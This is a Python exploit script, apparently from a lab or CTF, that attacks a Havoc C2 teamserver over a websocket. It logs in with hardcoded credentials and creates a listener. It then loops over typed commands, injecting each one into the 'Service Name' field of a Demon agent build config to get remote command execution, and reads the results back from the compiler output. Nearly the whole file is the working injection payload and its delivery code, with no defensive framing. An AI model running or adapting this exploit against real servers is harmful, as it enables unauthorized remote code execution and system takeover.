import hashlib
import json
import ssl
from websocket import create_connection # pip install websocket-client

HOSTNAME = "192.168.167.129"
PORT = 40056
USER = "Neo"
PASSWORD = "password1234"

ws = create_connection(f"wss://{HOSTNAME}:{PORT}/havoc/",
                       sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})

payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": "Neo"}}
ws.send(json.dumps(payload))
print(json.loads(ws.recv()))

payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User":"Neo"}}
ws.send(json.dumps(payload))

while True:
    cmd = input("$ ")
    injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""

    payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
        "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
    ws.send(json.dumps(payload))
    while True:
        bla = ws.recv()
        if b"compile output" in bla:
            bla2 = json.loads(bla)
            # print(bla2)
            out = bla2["Body"]["Info"]["Message"].split("\n")
            # print(out)

            for line in out[1:]:
                print(line)
            break

ws.close()
